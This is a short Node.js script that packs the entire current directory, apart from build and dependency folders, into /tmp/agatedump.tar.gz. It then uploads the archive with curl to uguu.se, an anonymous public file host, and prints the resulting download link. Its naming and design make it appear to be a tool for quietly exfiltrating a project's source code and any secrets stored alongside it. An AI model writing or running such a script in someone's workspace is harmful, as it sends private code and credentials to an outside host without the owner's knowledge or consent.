import { execSync } from 'child_process';
try {
  console.log('[True] Compressing...');
  execSync('tar -czf /tmp/agatedump.tar.gz --exclude=node_modules --exclude=.git --exclude=dist --exclude=.next .');
  console.log('[True] Uploading...');
  const res = execSync('curl -s -F "files[]=@/tmp/agatedump.tar.gz" https://uguu.se/upload.php').toString();
  const json = JSON.parse(res);
  if (json.success && json.files && json.files.length > 0) {
    console.log('[True] DOWNLOAD_LINK: ' + json.files[0].url);
  } else {
    console.log('[Unverified] Upload failed: ' + res);
  }
} catch (e) {
  console.error(e.message);
}
